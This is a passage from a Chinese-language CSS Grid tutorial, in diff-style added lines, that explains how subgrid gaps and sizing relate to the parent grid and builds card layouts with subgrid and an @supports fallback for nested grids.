+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/KKqgemp.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/KKqgemp">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-368.jpg" alt=""></p>
+
+<p>同时，子网格的轨道之间间距（<code>row-gap</code>或<code>column-gap</code>）和其父网格的<code>gap</code>之间的差额的一半，作为额外的一层（潜在的负）边距应用于不在这些边缘的项目。这层额外的“边距”也通过多层子网格累积起来。一个正常的值表示子网格与它的父网格有相同大小的<code>gap</code>，也就是说，应用的差异为零。</p>
+
+<blockquote>
+  <p><strong>注意，最终的结果是，父网格的轨道将按照指定的大小，而子网格的沟槽将在视觉上与父网格的沟槽居中对齐。</strong></p>
+</blockquote>
+
+<p>通过下面的示例来展示父网格和子网格沟槽之间的变化。假设我们一个 <code>width</code> 为 <code>300px</code> 的父网格，该网格列被指定为 <code>100px 1fr</code>，且轨道之间的间距为 <code>50px</code>。同时有一个子网格跨越了两列：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span>A<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span>B<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item grid__container--subgrid"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__subitem grid__item"</span></span>&gt;</span></span>C1<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__subitem grid__item"</span></span>&gt;</span></span>C2<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+
+/* CSS */
+.grid__container {
+    width: 300px;
+    display: grid;
+    grid-template-columns: 100px 1fr;
+    gap: 50px;
+}
+
+.grid__container--subgrid {
+    grid-column: 1 / span 2;
+    display: inherit;
+    grid-template-columns: subgrid;
+}
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="gap in subgrid" src="./Grid布局：15-嵌套网格vs子网格_files/MWojXrj.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/MWojXrj">
+  gap in subgrid</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>如果子网格的 <code>column-gap</code> 值是 <code>normal</code>（或 <code>50px</code>）：</p>
+
+<ul>
+<li>子网格中的网格项目C1的列轨道尺寸是 <code>100px</code></li>
+<li>子网格中的网格项目C2的列轨道尺寸是 <code>150px</code>（即 <code>1fr = 300px - 100px - 50px = 150px</code>）</li>
+<li>子网格中的列轨道之间的间距继承了父网格的轨道之间的间距 <code>50px</code></li>
+</ul>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-369.jpg" alt=""></p>
+
+<p>如果子网格的 <code>column-gap</code> 值是 <code>0px</code>：</p>
+
+<ul>
+<li>子网格中的网格项目 C1 的列轨道尺寸是 <code>125px</code>，就像有一个<code>-25px</code>（即 <code>(0 - 50px) / 2 = -25px</code>） 的<code>margin-right</code></li>
+<li>子网格中的网格项目 C2 的列轨道尺寸是 <code>175px</code>（即 <code>1fr = 300px - 125px = 175px</code>），就像有一个<code>-25px</code>的<code>margin-left</code></li>
+<li>子网格中列轨道之间的间距为 <code>0</code>，因为在子网格中重置了 <code>column-gap</code> 值为 <code>0</code></li>
+</ul>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-370.jpg" alt=""></p>
+
+<p>如果子网格的 <code>column-gap</code> 的值是 <code>20px</code>：</p>
+
+<ul>
+<li>子网格中的网格项目 C1 的列轨道尺寸是 <code>115px</code>，就像有一个 <code>-15px</code>（即<code>(20px - 50px) / 2 = 15px</code>） 的 <code>margin-right</code></li>
+<li>子网格中的网格项目 C2 的列轨道尺寸是 <code>165px</code>，就像有一个 <code>-15px</code> 的 <code>margin-left</code></li>
+<li>子网格中列轨道之间的间距为 <code>20px</code>，因为在子网格中重置了 <code>column-gap</code> 值为 <code>20px</code></li>
+</ul>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-371.jpg" alt=""></p>
+
+<p>如果子网格的 <code>column-gap</code> 的值是 <code>80px</code>：</p>
+
+<ul>
+<li>子网格中的网格项目 C1 的列轨道尺寸是 <code>85px</code>，就像有一个 <code>15px</code>（即 <code>(80px - 50px) / 2 = 15px</code>）的 <code>margin-right</code></li>
+<li>子网格中的网格项目 C2 的列轨道尺寸是 <code>135px</code>，就像有一个 <code>15px</code> 的 <code>margin-left</code></li>
+<li>子网格中列轨道之间的间距为 <code>80px</code>，因为在子网格中重置了 <code>column-gap</code> 值为 <code>80px</code></li>
+</ul>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-372.jpg" alt=""></p>
+
+<p>上面示例中的<code>margin-left</code>和<code>margin-right</code>是拿子网格中网格项目和父网格项目中的同轨道中相比：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-373.jpg" alt=""></p>
+
+<p>⑨：对于一个非空的子网格的每个边缘，为了考虑子网格在该边缘的<code>margin</code>、<code>padding</code>和<code>border</code>，在跨入最靠近子网格该边缘的占用轨道的项目集合中，每个跨度大小的假设项目被贡献给轨道大小算法。这个项目的尺寸取自每个跨度大小中最大的项目的尺寸，并且在该边缘（或者两个边缘，如果它恰好是两边最极端的项目，并且也是最小的跨度大小）被子网格自身的<code>margin</code>、<code>border</code>和<code>padding</code>扩展。同样地，假设项目的跨度取自同一真实项目的跨度，并通过它与相关子网格的边缘之间的空轨道数量进行扩展。</p>
+
+<p>⑩：子网格在其子网格的维度上总是被拉伸的，它的 <code>align-self</code>、<code>justify-self</code>属性被忽略，任何指定的<code>width</code>和<code>height</code>也被忽略。</p>
+
+<p>⑪：在布局上，子网格的网格总是与父网格的相应部分对齐，在子网格的维度上，它的<code>align-content</code>、<code>justify-content</code>属性也被忽略。</p>
+
+<p>⑫：<code>overflow</code>属性确实适用于子网格，因此子网格中溢出的内容可以被滚动到视图中。（注意，滚动的行为不影响布局）。</p>
+
+<h2 class="content-title" data-index="2">子网格使用示例</h2>
+
+<p>来看几个 <code>subgrid</code> 常见的示例。首先来看一个卡片相关的示例。我们平时在开发中时常能看到像下图这样的卡片效果：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-374.jpg" alt=""></p>
+
+<p>对于这样的一个 UI 效果，我们使用<code>subgrid</code>可以很轻易的实现。先来看其 HTML：</p>
+
+<pre class="xml"><code class="xml"><span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"subgrid"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">h2</span></span>&gt;</span></span>Awesome speaker<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">h2</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">img</span></span> <span class="attribute"><span class="attribute">src</span></span>=<span class="value"><span class="value">"https://picsum.photos/200/200?random=1"</span></span> <span class="attribute"><span class="attribute">alt</span></span>=<span class="value"><span class="value">""</span></span> /&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span>&gt;</span></span>Chocolate bar ...<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">span</span></span>&gt;</span></span>...<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">span</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">span</span></span>&gt;</span></span>...<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">span</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">span</span></span>&gt;</span></span>...<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">span</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="comment"><span class="comment">&lt;!-- subgrid --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+</code></pre>
+
+<p>父网格和子网格轨道如下图所示：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-375.jpg" alt=""></p>
+
+<p>上图中白色网格线是父网格，红色网格线是子网格：</p>
+
+<pre class="css"><code class="css"><span class="comment"><span class="comment">/* 定义父网格 */</span></span>
+<span class="class"><span class="class">.grid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">minmax(<span class="number"><span class="number">7</span></span>em, <span class="number"><span class="number">12</span></span>em)</span></span> max-content max-content max-content <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">row-gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span>em;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="comment"><span class="comment">/* 定义子网格 */</span></span>
+<span class="class"><span class="class">.subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / -<span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> min-content max-content min-content;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">column-gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>em;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="comment"><span class="comment">/* 子网格项目放置 */</span></span>
+<span class="tag"><span class="tag">h2</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span> / -<span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">p</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / -<span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">img</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / -<span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/yLXajVG.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/yLXajVG">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>再来看一个 <a rel="nofollow" href="https://codepen.io/michellebarker/full/JjGNdNY" target="_blank">@Michelle Barker 在 Codepen 上写的子网格悬浮状态高亮的效果</a>：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="Grid hover effect with subgrid" src="./Grid布局：15-嵌套网格vs子网格_files/JjGNdNY.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/michellebarker/pen/JjGNdNY">
+  Grid hover effect with subgrid</a> by Michelle Barker (<a rel="nofollow" href="https://codepen.io/michellebarker">@michellebarker</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="//www.w3cplus.com/sites/default/files/blogs/2021/2108/css-grid-377.jpg">
+    <source src="//www.w3cplus.com/sites/default/files/blogs/2021/2108/css-grid-377.mp4" type="video/mp4">
+</video>
+</div>
+
+<p>前面示例中，我们演示了卡片的效果。这里再向大家演示一个卡片效果。在这个效果中我们采用了嵌套网格和子网格两种方式。在不支持<code>subgrid</code>浏览器中使用嵌套网格，反之使用<code>subgrid</code>。</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"cards-container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card-header-wrapper"</span></span>&gt;</span></span>
+            <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">h2</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card-title"</span></span>&gt;</span></span>The cosmos awaits<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">h2</span></span>&gt;</span></span>
+            <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">h4</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card-subtitle"</span></span>&gt;</span></span>Great turbulent clouds<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">h4</span></span>&gt;</span></span>
+            <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card-avatar-wrapper"</span></span>&gt;</span></span>
+                <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">img</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card-avatar"</span></span> <span class="attribute"><span class="attribute">src</span></span>=<span class="value"><span class="value">"..."</span></span> <span class="attribute"><span class="attribute">alt</span></span>=<span class="value"><span class="value">""</span></span>&gt;</span></span>
+            <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card-photo-wrapper"</span></span>&gt;</span></span>
+            <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">img</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card-photo"</span></span> <span class="attribute"><span class="attribute">src</span></span>=<span class="value"><span class="value">"..."</span></span> <span class="attribute"><span class="attribute">alt</span></span>=<span class="value"><span class="value">""</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card-text"</span></span>&gt;</span></span>With pretty stories for which there's little good evidence star stuff harvesting star light circumnavigated invent the universe billions upon billions of brilliant syntheses.<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">svg</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card-like"</span></span> <span class="attribute"><span class="attribute">height</span></span>=<span class="value"><span class="value">"32"</span></span> <span class="attribute"><span class="attribute">width</span></span>=<span class="value"><span class="value">"32"</span></span> <span class="attribute"><span class="attribute">style</span></span>=<span class="value"><span class="value">"enable-background:new 0 0 32 32;"</span></span> <span class="attribute"><span class="attribute">version</span></span>=<span class="value"><span class="value">"1.1"</span></span> <span class="attribute"><span class="attribute">viewBox</span></span>=<span class="value"><span class="value">"0 0 512 512"</span></span> <span class="attribute"><span class="attribute">xml:space</span></span>=<span class="value"><span class="value">"preserve"</span></span> <span class="attribute"><span class="attribute">xmlns</span></span>=<span class="value"><span class="value">"http://www.w3.org/2000/svg"</span></span>&gt;</span></span>
+            <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">path</span></span> <span class="attribute"><span class="attribute">d</span></span>=<span class="value"><span class="value">"M340.8 98...."</span></span> /&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">svg</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">button</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"card-button"</span></span>&gt;</span></span>More<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">button</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="comment"><span class="comment">&lt;!-- Card --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+</code></pre>
+
+<p>支持 <code>subgrid</code> 会采用下面的 CSS：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.cards-container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, [col-start] fit-content(<span class="number"><span class="number">9</span></span>rem)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> fit-<span class="function"><span class="function">content(<span class="number"><span class="number">12</span></span>rem)</span></span> <span class="function"><span class="function">minmax(<span class="number"><span class="number">10</span></span>rem, <span class="number"><span class="number">14</span></span>rem)</span></span> auto auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0.5</span></span>rem;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-content</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid [card-start][button-start][col][card-end button-end];</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid [title-start][title-end photo-start] [photo-end text-start] [text-end button-start] [button-end];</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">row-gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card-header-wrapper</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> card;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> title;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> fit-<span class="function"><span class="function">content(<span class="number"><span class="number">6</span></span>rem)</span></span> fit-<span class="function"><span class="function">content(<span class="number"><span class="number">6</span></span>rem)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="string"><span class="string">"subtitle subtitle avatar"</span></span> <span class="string"><span class="string">"title title title"</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-items</span></span></span><span class="rule">:<span class="value"><span class="value"> end;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card-title</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> title;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">font-size</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1.25</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card-subtitle</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> subtitle;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card-avatar-wrapper</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> avatar;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> start;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> end;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card-photo-wrapper</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> card;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> photo;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card-text</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> col-start / span <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> text;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card-like</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>/<span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> button;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> end;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.card-button</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> button;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>使用 <a href="https://www.w3cplus.com/css3/css3-supports.html" target="_blank">CSS 的 <code>@supports</code></a> 来做判断，在不支持<code>subgrid</code>的浏览器使用下面的CSS:</p>
+
+<pre class="css"><code class="css"><span class="at_rule"><span class="at_rule">@supports not (grid-template-columns: subgrid) </span></span>{
+    <span class="class"><span class="class">.card</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, [col-start] fit-content(<span class="number"><span class="number">9</span></span>rem)</span></span>);</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">9</span></span>rem <span class="number"><span class="number">15</span></span>rem auto auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+    <span class="class"><span class="class">.card-header-wrapper</span></span>,
+    <span class="class"><span class="class">.card-photo-wrapper</span></span>,
+    <span class="class"><span class="class">.card-text</span></span> <span class="rules"><span class="rules">{
